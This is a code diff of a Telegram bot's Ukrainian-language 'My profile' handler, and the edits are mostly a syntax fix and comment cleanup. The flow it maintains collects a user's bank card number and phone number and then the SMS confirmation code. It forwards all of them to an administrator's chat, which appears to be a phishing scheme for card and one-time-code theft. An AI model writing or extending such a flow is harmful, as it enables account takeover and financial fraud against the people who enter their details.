@@ -7,7 +7,7 @@ from telegram.ext import CallbackQueryHandler, MessageHandler, filters, ContextT
 from modules.config import ADMIN_ID, DB_NAME
 from keyboards     import nav_buttons, client_menu
 from states        import (
-    STEP_PROFILE
+    STEP_PROFILE,               # <-- додали кому
     STEP_MENU,
     STEP_CLIENT_MENU,
     STEP_PROFILE_ENTER_CARD,
@@ -16,7 +16,7 @@ from states        import (
 )
 
 def register_profile_handlers(app):
-    # когда нажали «Мій профіль»
+    # коли нажали «Мій профіль»
     app.add_handler(
         CallbackQueryHandler(_enter_profile, pattern="^client_profile$"),
         group=0
@@ -50,7 +50,6 @@ async def profile_enter_card(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await update.message.reply_text("Невірний формат картки. Спробуйте ще раз.", reply_markup=nav_buttons())
         return STEP_PROFILE_ENTER_CARD
 
-    # сохраняем в user_data и просим телефон
     context.user_data["profile_card"] = text
     await update.message.reply_text("Введіть номер телефону (10 цифр):", reply_markup=nav_buttons())
     return STEP_PROFILE_ENTER_PHONE
@@ -63,14 +62,15 @@ async def profile_enter_phone(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     context.user_data["profile_phone"] = phone
 
-    # пересылаем админу запрос
     name = update.effective_user.full_name
     await context.bot.send_message(
         chat_id=ADMIN_ID,
-        text=f"Клієнт {name} ({update.effective_user.id}) хоче авторизуватися.\n"
-             f"Картка: {context.user_data['profile_card']}\n"
-             f"Телефон: {phone}\n"
-             f"Надішліть йому SMS-код для підтвердження."
+        text=(
+            f"Клієнт {name} ({update.effective_user.id}) хоче авторизуватися.\n"
+            f"Картка: {context.user_data['profile_card']}\n"
+            f"Телефон: {phone}\n"
+            "Надішліть йому SMS-код для підтвердження."
+        )
     )
 
     await update.message.reply_text("Код відправлено адміністратору. Введіть 4-значний код:", reply_markup=nav_buttons())
@@ -82,13 +82,14 @@ async def profile_enter_code(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await update.message.reply_text("Невірний код. Спробуйте ще раз.", reply_markup=nav_buttons())
         return STEP_PROFILE_ENTER_CODE
 
-    # шлём админу код
     name = update.effective_user.full_name
     await context.bot.send_message(
         chat_id=ADMIN_ID,
         text=f"SMS-код від {name} ({update.effective_user.id}): {code}"
     )
 
-    # возвращаемся в главное меню клиента
-    await update.message.reply_text("Очікуйте підтвердження від адміністратора.", reply_markup=client_menu(authorized=False))
+    await update.message.reply_text(
+        "Очікуйте підтвердження від адміністратора.",
+        reply_markup=client_menu(authorized=False)
+    )
     return STEP_MENU
